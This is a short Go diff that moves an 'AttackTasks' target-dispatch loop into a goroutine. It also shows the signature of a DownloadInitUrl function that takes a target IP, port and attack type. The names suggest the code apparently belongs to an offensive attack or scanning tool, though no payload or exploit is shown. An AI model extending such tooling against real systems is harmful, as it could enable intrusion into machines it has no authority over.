@@ -106,19 +106,21 @@ func (at *AttackTasks) Start() {
 		return false
 	})
 
-	for {
+	go func() {
+		for {
 
-		select {
+			select {
 
-		case target := <-targetChan:
+			case target := <-targetChan:
 
-			//try to run,if too many threads is live than wait some threads exit
-			<-at.syncChan
-			//ok
-			at.run(target)
+				//try to run,if too many threads is live than wait some threads exit
+				<-at.syncChan
+				//ok
+				at.run(target)
 
+			}
 		}
-	}
+	}()
 }
 
 func (at *AttackTasks) DownloadInitUrl(targetIP string, targetPort int, attackType string, fname string) string {
